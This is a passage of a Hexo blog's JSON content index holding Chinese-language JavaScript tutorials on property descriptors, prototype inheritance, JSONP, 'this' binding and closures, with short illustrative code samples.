{"meta":{"title":"Hexo","subtitle":"","description":"","author":"一枚小笨蛋","url":"https://xuxb.github.io","root":"/"},"pages":[{"title":"分类","date":"2021-04-27T09:20:32.000Z","updated":"2021-04-27T11:39:14.993Z","comments":false,"path":"categories/index.html","permalink":"https://xuxb.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-04-27T09:53:48.000Z","updated":"2021-04-27T11:39:16.496Z","comments":false,"path":"tags/index.html","permalink":"https://xuxb.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"JavaScript 属性描述符","slug":"JavaScript/JavaScript 属性描述符","date":"2021-04-27T12:24:48.000Z","updated":"2021-04-27T12:03:52.318Z","comments":true,"path":"2021/04/27/JavaScript/JavaScript 属性描述符/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/JavaScript%20%E5%B1%9E%E6%80%A7%E6%8F%8F%E8%BF%B0%E7%AC%A6/","excerpt":"","text":"属性描述符用来描述属性的属性 数据属性 value：该属性对应的值 writable：该属性是否可写 enumerable：该属性是否能被枚举（ for...in 循环和 Object.keys() ） configurable：该属性是否可配置（控制 writable、enumerable等属性） 访问器属性 set()：调用赋值运算符时，执行对应的方法 get()：调用.运算符时，执行对应的方法 note：value、writable 不可与 set()、get() 同时存在 12345678910111213141516var obj = &#123; name: &quot;xxb&quot;&#125;;Object.defineProperty(obj, &quot;age&quot;, &#123; enumerable: true, configurable: true, get: function () &#123; console.log(&quot;---&quot;); return 18; &#125;, set: function (newVal) &#123; console.log(&quot;+++++&quot;); &#125;&#125;);obj.age = 1231231;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"}]},{"title":"原型链与继承","slug":"JavaScript/原型链与继承","date":"2021-04-27T12:24:48.000Z","updated":"2021-04-30T06:38:08.810Z","comments":true,"path":"2021/04/27/JavaScript/原型链与继承/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E7%BB%A7%E6%89%BF/","excerpt":"","text":"原型链与继承1、原型链在面向类的语言中，类可以被复制（或实例化）多次，实例化（或者继承）一个类就意味着“把类的 行为复制到物理对象中”，对于每一个新实例来说都会重复这个过程。 在 JavaScript 中，并没有类似的复制机制。Javascript 中不能创建一个类的多个实例，只能创建多个对象，它们的 [[Prototype]] 关联的是同一个对象，这样一个对象就可以通过委托访问另一个对象的属性和函数。 JavaScript 中父类和子类的关系只存在于两者构造函数对应的 .prototype 对象中，它们的构造函数之间并不存在直接联系 JavaScript 中的函数无法真正地复制，只能复制对共享函数对象的引用，JavaScript 对象有一个特殊的 [[Prototype]] 内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建时 [[Prototype]] 属性都会被赋予一个非空的值。 函数本身并不是构造函数，然而，当在普通的函数调用前面加上 new 关键字之后，就会把这个函数调用变成一个“构造函数 调用”。实际上， new 会劫持所有普通函数并用构造对象的形式来调用它。在 JavaScript 中对于“构造函数”最准确的解释是，所有带 new 的函数调用。 new Foo() 这个函数调用实际上并没有直接创建关联，这个关联只是一个意外的副作用（新创建的对象添加了 __proto__ 属性）， new Foo() 只是间接完成了目标：一个关联到其他对象的新对象。更直接的方式是使用 Object.create(...)。 JavaScript 的 [[Prototype]] 机制本质上就是行为委托机制：[[Prototype]] 存在于对象中的一个内部链接，它会引用其他对象。通常来说，这个链接的作用是：如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 [[Prototype]] 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 [[Prototype]] ，以此类推。这一系列对象的链接被称为“原型链”。 123456789101112131415161718function Foo(name) &#123; this.name = name;&#125;Foo.prototype.myName = function() &#123; return this.name;&#125;;var a = new Foo( &quot;a&quot; );var b = new Foo( &quot;b&quot; );a.myName(); // &quot;a&quot;b.myName(); // &quot;b&quot;a.constructor === Foo // true// 看起来创建 `a` 和 `b` 时会把 `Foo.prototype` 对象复制到这两个对象中，然而事实并不是这样，// 在创建的过程中， `a` 和 `b` 的内部 [[Prototype]] 都会关联到 `Foo.prototype` 上。// 当 `a` 和 `b` 中无法找到 `myName` 时，它会在 `Foo.prototype` 上找到。// 看起来 `a.constructor === Foo` 为真意味着 `a` 确实有一个指向 `Foo` 的 `.constructor` 属性，// 但是事实不是这样，实际上， `.constructor` 引用同样被委托给了 `Foo.prototype` ，而`Foo.prototype.constructor` 默认指向 `Foo` 2、属性遍历使用 for...in 遍历对象时原理和查找 [[Prototype]] 链类似，任何可以通过原型链访问到且 enumerable: true 的属性都会被枚举。使用 in 操作符检查属性在对象中是否存在时，也会查找对象的整条原型链（无论属性是否可枚举） 123456789101112131415var obj = &#123; name: &#x27;xxb&#x27;&#125;;Object.defineProperty(obj, &#x27;age&#x27;, &#123; age: 24, enumerable: false&#125;)for (let key in obj) &#123; console.log(key);&#125;console.log(&#x27;age&#x27; in obj);console.log(&#x27;toString&#x27; in obj); 3、属性设置与屏蔽在于原型链上层时 obj.foo = “bar” 会出现的三种情况。 如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性并且 writable: true ，那就会直接在 obj 中添加一个名为 foo 的新属性，它是屏蔽属性。 如果在 [[Prototype]] 链上层存在 foo ，但 writable:false，那么无法修改已有属性或者在 obj 上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。总之，不会发生屏蔽。 如果在 [[Prototype]] 链上层存在 foo 并且它是一个 setter，那就一定会调用这个 setter。 foo 不会被添加到obj ，也不会重新定义 foo 这个 setter。 [[Prototype]] 链上层的只读属性会阻止 [[Prototype]] 链下层隐式创建（屏蔽）同名属性。这样做主要是为了模拟类属性的继承，比如父类的属性只读级别，则子类的属性应该不高于只读级别。 解决第2、3种情况可使用 Object.defineProperty() , 而不是使用 = 赋值 123456789// 情形1 生成屏蔽属性var parent = &#123; name: &#x27;aaaa&#x27;&#125;;var son = Object.create(parent);son.name = &#x27;bbbb&#x27;;console.log(son.name); 123456789// 情形2 赋值时报错var parent = &#123;&#125;;Object.defineProperty(parent, &#x27;name&#x27;, &#123; value: &#x27;aaa&#x27;, writable: false&#125;)var son = Object.create(parent);son.name = &#x27;bbbb&#x27;; // TypeError: Cannot assign to read only property &#x27;name&#x27; of object &#x27;#&lt;Object&gt;&#x27; 12345678910111213141516// 情形3 赋值失败并执行 `set()`var parent = &#123;&#125;;Object.defineProperty(parent, &#x27;name&#x27;, &#123; set () &#123; console.log(&#x27;set&#x27;); &#125;&#125;)var son = Object.create(parent);son.name = &#x27;bbbb&#x27;; console.log(son.name);// ----- output -----// set// undefined 4、proto 属性浏览器支持一种非标准的方法来访问内部 [[Prototype]] 属性， .__proto__ 的实现大致如下： 123456789Object.defineProperty(Object.prototype, &quot;__proto__&quot;, &#123; get: function() &#123; return Object.getPrototypeOf( this ); &#125;, set: function(o) &#123; Object.setPrototypeOf(this, o); return o; &#125;&#125;); 可使用 Object.getPrototypeOf()、Object.setPrototypeOf() 替代 5、实现继承的几种方式5.1 使用混入方式实现继承123456789101112131415161718192021222324function mixin (sourceObj, targetObj) &#123; for (let k in sourceObj) &#123; if (!targetObj[k]) &#123; targetObj[k] = sourceObj[k]; &#125; &#125; return targetObj;&#125;var Person = &#123; name: &#x27;nobody&#x27;, showName () &#123; console.log(this.name); &#125;&#125;var stu = mixin(Person, &#123; name: &#x27;xxb&#x27;, age: 24, showAge () &#123; console.log(this.age); &#125;&#125;)stu.showName(); 5.2 使用对象委托实现继承12345678910111213141516171819202122232425262728var Person = &#123; init (name) &#123; this.name = name; &#125;, showName () &#123; console.log(this.name); &#125;&#125;;var Student = Object.create(Person);Student.init = function (name, age) &#123; Person.init.call(this, name); this.age = age;&#125;;Student.showAge = function () &#123; console.log(this.age);&#125;;var stu = Object.create(Student);stu.init(&#x27;xxb&#x27;, 24);stu.showName();// `Object.create()` 会创建一个新对象并把它关联到指定的对象就可以充分发挥 [[Prototype]] 机制的作用（委托），// 并且避免不必要的麻烦（如使用 `new` 的构造函数调用会生成 `.prototype` 和 `.constructor` 引用）。// `Object.create() `没有其他副作用，ES6添加了辅助函数 `Object.setPrototypeOf()` ，用以实现同样的功能 5.3 使用原型链继承1234567891011121314151617181920212223242526272829function Person (name) &#123; this.name = name;&#125;Person.prototype.showName = function () &#123; console.log(this.name);&#125;function Student (name, age) &#123; Person.call(this, name); this.age = age;&#125;Student.prototype = Object.create(Person.prototype);Student.prototype.constructor = Student;Student.prototype.showAge = function () &#123; console.log(this.age);&#125;var stu = new Student(&#x27;xxb&#x27;, 24);stu.showName();// 如果使用 `Student.prototype = Person.prototype` 并不会创建一个关联到 `Student.prototype` 的新对象，// 它只是让 `Student.prototype` 直接引用 `Person.prototype` 对象。// 因此当执行类似 `Student.prototype.show = ... ` 的赋值语句时会直接修改 `Person.prototype` 对象本身。// 显然这不是想要的结果，否则根本不需要 `Student` 对象，直接使用 `Person` 就行了。// 如果使用 `Student.prototype = new Person()` 的确会创建一个关联到 `Student.prototype` 的新对象。// 但是它使用了 `Person()` 的“构造函数调用”，如果函数 `Person` 有一些副作用（比如给 this 添加数据属性、修改状态、注册到其他对象等）的话，就会影响到 `Student()` 的“后代” 5.4 使用 class 实现继承12345678910111213141516171819202122// 使用 es6 的 `class` 实现继承class Person &#123; constructor (name) &#123; this.name = name; &#125; showName () &#123; console.log(this.name); &#125;&#125;class Student extends Person &#123; constructor (name, age) &#123; super(name); this.age = age; &#125; showAge () &#123; console.log(this.age); &#125;&#125;var stu = new Student(&#x27;xxb&#x27;, 24);stu.showAge(); class 的优点： 不需要引用 .prototype 对象； 不需要通过 Object.create() 来替换 .prototype 对象，也不需要设置 .__proto__ 或者 Object.setPrototypeOf() 来指定原型链； 可以通过 super() 来实现相对多态，这样任何方法都可以引用原型链上层的同名方法。 class 字面语法不能声明属性（只能声明方法），避免原型链末端的“实例”可能会意外地获取 其他地方的属性； 可以通过 extends 很自然地扩展对象（子）类型，甚至是内置的对象（子）类型。 class 的缺点： class 基本上只是现有 [[Prototype]] 委托机制的一种语法糖。即 class 并不会像传统面向类的语言一样在声明时静态复制所有行为。如果无意修改或者替换了父“类”中的一个方法，那子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是使用基于 [[Prototype]] 的实时委托。 用 class 定义看上去不能被修改（静态），实际上依然可以被修改（动态） 不能定义属性，只能往 prototype 上添加，但这样违背了 class 语法的本意，在实现中暴露了 .prototype 出于性能考虑， super 并不像 this 一样是晚绑定（动态绑定）的，它会在创建时静态绑定。 12345678910111213141516171819202122// `super` 的静态绑定class P &#123; foo () &#123; console.log(&#x27;P.foo&#x27;); &#125;&#125;class C extends P &#123;&#125;var c1 = new C();c1.foo(); // &quot;P.foo&quot;var D = &#123; foo: function() &#123; console.log( &quot;D.foo&quot; ); &#125;&#125;;var E = &#123; foo: C.prototype.foo&#125;;Object.setPrototypeOf(E, D); // 把 E 委托到 DE.foo(); // &quot;P.foo&quot; 相关方法： Object.create()：创建一个对象并把这个对象的 [[Prototype]] 关联到指定的对象 Object.setPrototypeOf()：设置一个指定的对象的原型 ( 即内部[[Prototype]]属性）到另一个对象或 null Object.getPrototypeOf()：返回指定对象的原型（即内部 [[Prototype]] 属性的值） Object.defineProperty()：在一个对象上定义一个新属性，或者修改一个对象的现有属性 Object.prototype.hasOwnproperty()：返回一个布尔值，指示对象是否具有指定的属性作为自身（不继承）属性 Object.prototype.isPrototypeOf()：测试一个对象是否存在于另一个对象的原型链上，与 instanceof 作用类似 fon ... in ...：以任意顺序遍历一个对象的可枚举属性（包括原型链上的属性，主要用于 Object 对象） fon ... of ...：在可迭代对象(包括 Array, Map, Set, String, arguments 对象等)上创建一个迭代循环，遍历每个属性值","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 基础","slug":"JavaScript-基础","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%9F%BA%E7%A1%80/"}]},{"title":"JSONP 原理","slug":"JavaScript/JSONP 原理","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-27T09:42:54.671Z","comments":true,"path":"2021/04/27/JavaScript/JSONP 原理/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/JSONP%20%E5%8E%9F%E7%90%86/","excerpt":"","text":"JSONP 原理由于同源策略的原因，浏览器限制了 Ajax 请求必须在同一个源中，即统一协议、域名和端口号 说明： 跨域的 Ajax 请求可以发出，但是必须在服务器端响应头中设置 Access-Control-Allow-Origin：“*”属性，否则在跨域请求的预检请求阶段（OPTIONS请求会携带 Access-Control-Request-Method、Access-Control-Request-Headers等头信息），如果后端不允许此次预检请求，则不会再发送后面真正的请求 以下标签可以跨域： JSONP （JSON with Padding）说明: 在浏览器端的 js 中声明回调函数之后，通过 &lt;script&gt; 标签向服务器跨域请求数据，服务器将请求结果包裹在回调函数中，并动态执行回调函数。安全性： 是一种不安全的通信方式。 &lt;script&gt; 会执行跨域服务器中返回的任意 js 代码，只适用于可信的第三方脚本。优点： 配置简单，支持旧版浏览器，但不安全，不支持 POST 示例： 浏览器端声明 callbackfunction (data) &#123; console.log(data); &#125; 动态创建 &lt;script&gt; 标签，并将 src 指向跨域地址 http://www.runoob.com/ajax?jsonp=callbackFunction 服务器端返回 callbackFunction([&quot;customername1&quot;,&quot;customername2&quot;]); 请求结束后，&lt;script&gt; 标签内的 js 代码会自动执行，jsonp 流程结束 123456789101112131415161718// jsonp 实现方式function jsonp (&#123;url, param, callback&#125;) &#123; return new Promise((resolve, reject) =&gt; &#123; var script = document.createElement(&#x27;script&#x27;) window.callback = function (data) &#123; resolve(data) document.body.removeChild(script) &#125; var param = &#123;...param, callback&#125; var arr = [] for (let key in param) &#123; arr.push(`$&#123;key&#125;=$&#123;param[key]&#125;`) &#125; script.src = `$&#123;url&#125;?$&#123;arr.join(&#x27;&amp;&#x27;)&#125;` document.body.appendChild(script) &#125;)&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JSONP","slug":"JSONP","permalink":"https://xuxb.github.io/tags/JSONP/"},{"name":"同源策略","slug":"同源策略","permalink":"https://xuxb.github.io/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"}]},{"title":"this 指向","slug":"JavaScript/this 指向","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-27T12:01:49.476Z","comments":true,"path":"2021/04/27/JavaScript/this 指向/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/this%20%E6%8C%87%E5%90%91/","excerpt":"","text":"this 指向1、默认绑定独立函数调用时应用了 this 的默认绑定，this 指向全局对象 如果使用严格模式（use strict;），那么全局对象将无法使用默认绑定，因此 this 会绑定到 undefinednode 环境中，每个模块被 function (exports, require, module, __filename, __dirname) &#123;...&#125; 包裹，所以 this 是 &#123;&#125; 对象，而函数中的 this 是 global 对象，而且通过 var 声明的变量不会挂载在 global 对象下 123456789// ---- 浏览器环境中 非严格模式------var a = 2;console.log(this); // window 对象function foo () &#123; console.log(this); // window 对象 console.log(this.a); // 2&#125;foo(); // 2 12345678910// ---- 浏览器环境中 严格模式------&quot;use strict&quot;;var a = 2;console.log(this); // window 对象function foo () &#123; console.log(this); // undefined console.log(this.a); // TypeError&#125;foo(); // 2 12345678// ---- node 环境中 ------var a = 2;console.log(this); // &#123;&#125;function foo () &#123; console.log(this); // global 对象 console.log(this.a); // undefined&#125;foo(); // 2 2、隐式绑定调用位置是否有上下文对象（即该方法是否被某个对象所拥有），隐式绑定规则会把函数调用中的 this 绑定到这个上下文对象。 无论是直接在 obj 中定义还是先定义再添加为引用属性，这个函数严格来说都不属于 obj 对象（可以赋值给其他对象，改变上下文），调用位置会使用 obj 上下文来引用函数，因此可以说函数被调用时obj 对象“拥有”它 12345678910111213141516// 对象属性引用链中只有最后一层会影响调用位置function foo() &#123; console.log(this.a);&#125;var obj2 = &#123; a: 42, foo&#125;;var obj1 = &#123; a: 2, obj2&#125;;obj1.obj2.foo(); // 42 12345678910111213// ** 隐式丢失 **// 被隐式绑定的函数丢失了绑定对象，则这个换上会应用默认绑定，从而把 this 绑定到全局对象或者 undefined // `bar` 是 `obj.foo` 的一个引用，但实际上，它引用的是 `foo` 函数本身，此时的 `bar()` 其实是一个不带任何修饰的函数调用，应用了默认绑定。var obj = &#123; a: 2, foo: function () &#123; console.log(this.a); &#125;&#125;;var bar = obj.foo; // 函数别名！var a = &quot;oops, global&quot;; // a 是全局对象的属性bar(); // &quot;oops, global&quot; 回调函数会使 this 丢失或被修改 3、显式绑定使用 call()、apply()、bind() 方法绑定 this 对象，动态切换上下文。 123456789// obj 对象绑定到 foo 函数function foo() &#123; console.log( this.a );&#125;var obj = &#123; a: 2&#125;;foo.call( obj ); // 2 bind() 会返回一个硬编码的新函数，它会把参数设置为 this 的上下文并调用原始函数 4、new 绑定发生函数调用时，会进行以下步骤： 创建（或者说构造）一个全新的对象。 这个新对象会被执行 [[ 原型 ]] 连接。 这个新对象会绑定到函数调用的 this 。 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。 123456function foo(a) &#123; this.a = a;&#125;var bar = new foo(2);console.log( bar.a ); // 2 5、箭头函数箭头函数不使用 this 的四种标准规则，而是根据外层的词法作用域（函数或全局）来决定 this 。 123456789101112131415161718function foo() &#123; setTimeout(() =&gt; &#123; console.log(&#x27;id:&#x27;, this.id); &#125;, 100);&#125;var id = 21;foo.call(&#123; id: 42 &#125;); // output ------&gt; 42// ------ 使用 traceur 编译后的代码如下： -----function foo() &#123; var $__1 = this; setTimeout(function() &#123; console.log(&#x27;id:&#x27;, $__1.id); &#125;, 100);&#125;var id = 21;foo(&#123;id: 42&#125;); // output ------&gt; 42 6、常见 this 指向总结 在全局环境下，即在任何函数体外，this 指向全局对象（window 、global）； 函数直接调用时，this 指向全局对象，如执行函数中嵌套的函数； 对象方法中的 this ，与调用该方法的对象绑定； 构造函数中的 this ，与即将被创建的新对象绑定； 通过 call 和 apply 调用，函数中的 this 被动态绑定到第一个元素 ； 通过 bind 方法传入对象，函数中this 将永久地被绑定到了 bind 的第一个参数； 事件处理函数中的 this，指向监听器所在的 DOM 元素，与 event.currentTarget 一致； 7、判断 this 指向的步骤 首先查看函数调用的位置 看这个函数是否被显示的使用 call、 apply、 bind 等显示绑定，如果是，则会在代码中明确说明 this 的指向，否则进行下一步 看这个函数是被谁（对象、数组、函数等）调用，如果是用 . 操作符调用，则 this 指向该对象，否则进行下一步 是否使用 new 关键字调用了该函数，如果是，this 指向由 JavaScript 解释器创建的新创建的对象，否则进行下一步 是否在箭头函数中使用 this，如果是，则 this 指向父作用域中的上下文对象，否则进行下一步 如果是使用严格模式，则 this 关键字是未定义的，否则 this 指向全局对象 window 或 global 8、注意事项 函数的执行过程中调用位置如何决定 this 的绑定对象 如果把 null 或者 undefined 作为 this 的绑定对象传入 call 、 apply 或者 bind ，这些值在调用时会被忽略，实际应用的是默认绑定规则 绑定优先级：new 绑定 &gt; 显式绑定 &gt; 隐身绑定 &gt; 默认绑定","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"作用域与闭包","slug":"JavaScript/作用域与闭包","date":"2021-04-27T09:24:48.000Z","updated":"2021-04-29T09:55:52.036Z","comments":true,"path":"2021/04/27/JavaScript/作用域与闭包/","link":"","permalink":"https://xuxb.github.io/2021/04/27/JavaScript/%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E9%97%AD%E5%8C%85/","excerpt":"","text":"作用域与闭包1、JavaScript 编译源代码在执行之前会进行编译，分为三个步骤： 分词/词法分析：将由字符组成的字符串分解成有意义的代码块，这些代码块被称为词法单元 解析/语法分析：将词法单元流（数组）转换成一个由元素逐级嵌套所组成的代表了程序语法结构的树。这个树被称为“抽象语法树”（Abstract Syntax Tree，AST） 代码生成：将 AST 转换为可执行代码（一组机器指令） JavaScript引擎要复杂些，在语法分析和代码生成阶段有特定的步骤来对运行性能进行优化，包括对冗余元素进行优化等。 引擎：从头到尾负责整个 JavaScript 程序的编译及执行过程。 编译器：负责语法分析及代码生成等脏活累活（详见前一节的内容）。 作用域：负责收集并维护由所有声明的标识符（变量）组成的一系列查询，并实施一套非常严格的规则，确定当前执行的代码对这些标识符的访问权限。 以变量赋值为例，首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在作用域中查找该变量，如果能够找到就会对它赋值。 2. 作用域作用域：是一套规则，用于确定在何处以及如何查找变量（标识符） 当一个块或函数嵌套在另一个块或函数中时，就发生了作用域嵌套。因此，在当前作用域中无法找到某个变量时，引擎就会在外层嵌套的作用域中继续查找，直到找到该变量，或抵达最外层的作用域（也就是全局作用域）为止。 12345678910// 气泡1 （全局环境）function foo (a) &#123; // 气泡2 var b = a * 2; function bar (c) &#123; // 气泡3 console.log(a, b, c); &#125;&#125;foo(2); 气泡1包含着整个全局作用域，其中只有一个标识符： foo 。 气泡2包含着 foo 所创建的作用域，其中有三个标识符： a 、 bar 和 b 。 气泡3包含着 bar 所创建的作用域，其中只有一个标识符： c 。 作用域有两种工作模型：词法作用域、动态作用域 词法作用域是在定义时确定的，关注函数在何处声明动态作用域是在运行时确定的，关注函数从何处调用，其作用域链是基于运行时的调用栈的。 123456789101112131415var a = 2;function foo() &#123; console.log(a);&#125;function bar() &#123; var a = 3; foo();&#125;bar();// 如果js是词法作用域（就是），那么应该会输出 2// 如果js是动态作用域，那么应该会输出 3 3、词法作用域在 JavaScript 中采用词法作用域，即代码在编写过程中体现出来的作用范围，代码一旦写好，不用执行，作用范围就已经确定好了（大部分情况如此，this、with、eval除外）， 这就是所谓的词法作用域。 作用域查找始终从运行时所处的最内部作用域开始，逐级向外或者说向上进行，直到遇见第一个匹配的标识符为止。 在多层的嵌套作用域中可以定义同名的标识符，这叫作遮蔽效应（内部的标识符遮蔽了外部的标识符） 全局变量会自动成为全局对象（比如浏览器中的 window 对象）的属性，因此可以不直接通过全局对象的词法名称，而是间接地通过对全局对象属性的引用来对其进行访问。 在 JavaScript 中词法作用域规则: 函数允许访问函数外的数据 整个代码结构中只有函数可以限定作用域（ES6 新增块级作用域） 作用规则首先使用提升规则分析 通过作用域链进行查找，如果当前作用规则作用域中已查找到，则不再往父作用域查找 4、词法欺骗4.1 evalJavaScript 中的 eval() 函数可以接受一个字符串为参数，并将其中的内容视为好像在书写时就存在于程序中这个位置的代码。eval() 在运行期修改了书写期的词法作用域。 换句话说，可以在你写的代码中用程序生成代码并运行，就好像代码是写在那个位置的一样。eval() 通过代码欺骗和假装成书写时（也就是词法期），来实现修改词法作用域环境的。 12345678function foo(str, a) &#123; eval( str ); // 欺骗！ console.log( a, b );&#125;var b = 2;foo( &quot;var b = 3;&quot;, 1 ); // 1, 3// 码实际上在 foo(..) 内部创建了一个变量 b ，并遮蔽了外部（全局）作用域中的同名变量 4.2 withwith 通常被当作重复引用同一个对象中的多个属性的快捷方式，可以不需要重复引用对象本身。 123456789101112131415function foo(obj) &#123; with (obj) &#123; a = 2; &#125;&#125;var o1 = &#123; a: 3 &#125;;var o2 = &#123; b: 3 &#125;;foo( o1 );console.log( o1.a ); // 2foo( o2 );console.log( o2.a ); // undefinedconsole.log( a ); // 2——不好，a 被泄漏到全局作用域上了！// o2 的作用域、 foo(..) 的作用域和全局作用域中都没有找到标识符 a ，因此当 a＝2 执行时，// 自动创建了一个全局变量（因为是非严格模式）。 总结： eval() 函数如果接受了含有一个或多个声明的代码，就会修改其所处的词法作用域。 with 声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域。 严格模式下，eval() 和 with 功能受限制 如果出现了 eval() 或 with ，所有的优化可能都是无意义的，因此最简单的做法就是完全不做任何优化。 5、函数作用域函数作用域：指属于这个函数的全部变量都可以在整个函数的范围内使用及复用（包括嵌套的作用域）。 立即执行函数表达式：（Immediately Invoked Function Expression） 1234567891011var a = 2;(function IIFE(global, undefined) &#123; var a = 3; console.log( a ); // 3 console.log( global.a ); // 2&#125;)(window);console.log( a ); // 2// 将 window 对象的引用传递进去，使得对全局对象的引用变得比引用一个没有“全局”字样的变量更加清晰// 解决 undefined 标识符的默认值被错误覆盖导致的异常 6、块作用域块作用域：指变量和函数属于所处的作用域在某个代码块中（通常指 { .. } 内部） let 为其声明的变量隐式地创建了块级作用域使用块作用域更加主流，也便于开发、维护 7、变量提升提升：无论作用域中的声明出现在什么地方，都将在代码本身被执行前首先进行处理。可以将这个过程形象地想象成所有的声明（变量和函数）都会被“移动”到各自作用域的最顶端。 只有声明本身会被提升，而赋值或其他运行逻辑会留在原地 函数声明会被提升，但是函数表达式却不会被提升 函数声明和变量声明都会被提升。但函数会首先被提升，然后才是变量 在每个作用域中都会被提升，包括全局作用域、函数作用域、块级作用域 以 var a = 2; 为例，JavaScript 会看做两部分 var a; 和 a = 2;，第一个定义声明是在编译阶段进行的，第二个赋值声明会被留在原地等待执行阶段。 1234567// 变量声明会被提升function foo() &#123; var a; console.log( a ); // undefined a = 2;&#125;foo(); 12345// 函数表达式不会被提升foo(); // 不是 ReferenceError, 而是 TypeError!var foo = function bar() &#123; console.log(12312);&#125;; 12345678910111213141516171819foo(); // 1var foo;function foo() &#123; console.log( 1 );&#125;foo = function() &#123; console.log( 2 );&#125;;// ----- output -------// 输出：1// ----- javascript 理解成如下形式 -----// function foo() &#123;// console.log( 1 );// &#125;// foo(); // 1// foo = function() &#123;// console.log( 2 );// &#125;; 8、闭包概念：当函数可以记住并访问所在的词法作用域时，就产生了闭包，即使函数是在当前词法作用域之外执行。 作用： 变量和对象的私有化 数据缓存 模块化 12345678910function wait(message) &#123; setTimeout(function timer() &#123; console.log(message); &#125;, 1000);&#125;wait( &quot;Hello, closure!&quot; );// 将一个内部函数（名为 timer ）传递给 setTimeout(..) 。// timer 具有涵盖 wait(..) 作用域的闭包，因此还保有对变量 message 的引用。// wait(..) 执行 1000 毫秒后，它的内部作用域并不会消失， timer 函数依然保有 wait(..) 作用域的闭包 在定时器、事件监听器、Ajax 请求、跨窗口通信、Web Workers 或者任何其他的异步（或者同步）任务中，只要使用了回调函数，实际上就是在使用闭包 9、闭包与循环1234567for (var i=1; i&lt;=5; i++) &#123; setTimeout(function timer() &#123; console.log(i); &#125;, i*1000);&#125;// outupt ----&gt; 6 6 6 6 6// 原因：所有的 `i` 被封闭在一个共享的全局作用域中，因此实际上只有一个 `i` 123456789for (var i=1; i&lt;=5; i++) &#123; (function() &#123; setTimeout(function timer() &#123; console.log( i ); &#125;, i*1000); &#125;)();&#125;// outupt ----&gt; 6 6 6 6 6// 原因：每个函数都是一个作用域，但这个作用域是空的，当查询 `i` 时，依然会从父作用域中查找，实际上是一个 `i` 123456789101112131415161718for (var i=1; i&lt;=5; i++) &#123; (function() &#123; var j = i; setTimeout(function timer() &#123; console.log( j ); &#125;, j*1000); &#125;)();&#125;for (var i=1; i&lt;=5; i++) &#123; (function(j) &#123; setTimeout(function timer() &#123; console.log( j ); &#125;, j*1000); &#125;)(i);&#125;// outupt ----&gt; 1 2 3 4 5// 原因：IIFE 会为每个迭代都生成一个新的作用域，都有自己的变量，用 `j` 保存 `i` 的值 123456789101112131415for (var i=1; i&lt;=5; i++) &#123; let j = i; // 产生了新的块级作用域！ setTimeout(function timer() &#123; console.log(j); &#125;, j*1000);&#125;for (let i=1; i&lt;=5; i++) &#123; setTimeout(function timer() &#123; console.log(i); &#125;, i*1000);&#125;// outupt ----&gt; 1 2 3 4 5// 原因：变量 `i` 是 let 声明的，当前的i只在本轮循环有效，所以每一次循环的 `i` 其实都是一个新的变量, // JavaScript 引擎内部会记住上一轮循环的值，初始化本轮的变量 `i` 时，就在上一轮循环的基础上进行计算 12345678910// for 循环中 let 还有一个特别之处，就是设置循环变量的那部分是一个父作用域，而循环体内部是一个单独的子作用域for (let i = 0; i &lt; 3; i++) &#123; let i = &#x27;abc&#x27;; console.log(i);&#125;// ------ output ------// abc// abc// abc 10、闭包与模块模块：返回的对象中含有对内部函数而不是内部数据变量的引用，保持内部数据变量是隐藏且私有的状态，并提供公共的API 12345678910111213141516// 模块模式function foo() &#123; var something = &quot;cool&quot;; var another = [1, 2, 3]; function doSomething() &#123; console.log(something); &#125; function doAnother() &#123; console.log(another.join( &quot; ! &quot; )); &#125; return &#123; doSomething, doAnother &#125;&#125; 模块模式的两个必要条件： 必须有外部的封闭函数，该函数必须至少被调用一次（每次调用都会创建一个新的模块实例）。 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并且可以访问或者修改私有的状态。","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 